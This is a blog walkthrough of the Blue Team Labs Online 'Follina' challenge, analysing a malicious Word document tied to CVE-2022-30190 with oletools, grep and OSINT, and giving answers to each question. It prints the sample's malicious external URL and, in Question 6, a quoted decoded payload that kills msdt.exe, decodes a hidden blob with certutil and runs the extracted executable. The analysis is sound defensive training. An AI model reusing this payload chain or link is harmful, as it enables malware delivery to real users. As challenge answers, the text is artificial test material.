---
title: Follina Walkthrough - btlo
date: 2026-09-02
tags: ["linux", "osint", "malware"]
---

This is an walkthrough explaining how to complete the follina chanllenge on Blue Team labs online
Challenge link: [follina](https://blueteamlabs.online/home/challenge/follina-f1a3452f34)

> NOTE: This file includes REAL MALWARE. Please be careful when interacting with it. We strongly suggest players create a 'dirty' virtual machine to analyse malicious files in.

## Scenario

On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team.

> NOTE: The given zip file needs to be opened with password `infected`

## Challenge Submission

**Question 1. What is the SHA1 hash value of the sample? (Format: SHA1Hash)**

```
> pranav@server:~/btlo_follina/sample$ sha1sum sample.doc 
06727ffda60359236a8029e0b3e8a0fd11c23313  sample.doc
```

**Answer: `06727ffda60359236a8029e0b3e8a0fd11c23313`**

**Question 2. According to VirusTotal, what is the full filetype of the provided sample? (Format: X X X X)**

We need to upload the `sample.doc` to [Virus Total](https://www.virustotal.com/gui/home/upload)


**Answer: Open Office XML Document**


**Question 3. Extract the URL that is used within the sample and submit it (Format: https://x.domain.tld/path/to/something)**

We can use oleid to scan the files of external references
```
remnux@remnux:~/btlo/sample$ oleid sample.doc 
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: sample.doc
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 2007+       |info      |                          
                    |Document (.docx)    |          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type            
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.               
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |1                   |HIGH      |External relationships    
Relationships       |                    |          |found: oleObject - use    
                    |                    |          |oleobj for details        
--------------------+--------------------+----------+--------------------------
```

We can see that there is one external relationship with high risk, we can use
oleobj to analyse it:

```
remnux@remnux:~/btlo/sample$ oleobj sample.doc 
oleobj 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

-------------------------------------------------------------------------------
File: 'sample.doc'
Found relationship 'oleObject' with external link https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!
```

**Answer: `https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html`**

**Question 4. What is the name of the XML file that is storing the extracted URL? (Format: file.name.ext)**

Using the previous answer we can simply grep it:

```
remnux@remnux:~/btlo/sample$ grep -r "https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html"
word/_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
remnux@remnux:~/btlo/sample$
```

**Answer: `word/_rels/document.xml.rels`**

**Question 5. The extracted URL accesses a HTML file that triggers the vulnerability to execute a malicious payload. According to the HTML processing functions, any files with fewer than <Number> bytes would not invoke the payload. Submit the <Number> (Format: Number of Bytes)**

Unfourtunately the site is no longer live so we use our osint skills, search 
`"https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug"` 
(don't forget the \") in google which will eventually lead to [huntress](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug) which says 
`we were able to confirm any files with fewer than 4096 bytes would not invoke the payload.`

**Answer : 4096**

**Question 6. After execution, the sample will try to kill a process if it is already running. What is the name of this process? (Format: filename.ext)**

From the huntress website we can see the decoded payload:

```
$cmd = "c:\windows\system32\cmd.exe";

Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";

Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe";
```

We can see the taskkill msdt.exe

**Answer: `msdt.exe`**


**Question 7. You were asked to write a process-based detection rule using Windows Event ID 4688. What would be the ProcessName and ParentProcessname used in this detection rule? [Hint: OSINT time!] (Format: ProcessName, ParentProcessName)**

In the huntress blog under the section of `Detection Efforts`
we can see that `Payloads executed by this attack vector will create a child process of msdt.exe under the offending Microsoft Office parent.` 

**Answer: `msdt.exe, winword.exe`**

**Question 8) Submit the MITRE technique ID used by the sample for Execution [Hint: Online sandbox platforms can help!] (Format: TXXXX)**

We know that the code is executed via cmd so in the [MITRE ATT&CK](attack.mitre.org) it falls under `T1059`

**Answer: `T1059`

**Question 9. Submit the CVE associated with the vulnerability that is being exploited (Format: CVE-XXXX-XXXXX)**

Using the prevously done osint we can get the cve

**Answer: CVE-2022-30190**

Thank you and have a nice day

## See also

- [My projects](/projects) — tools I have built
- [Experience](/experience) — my background
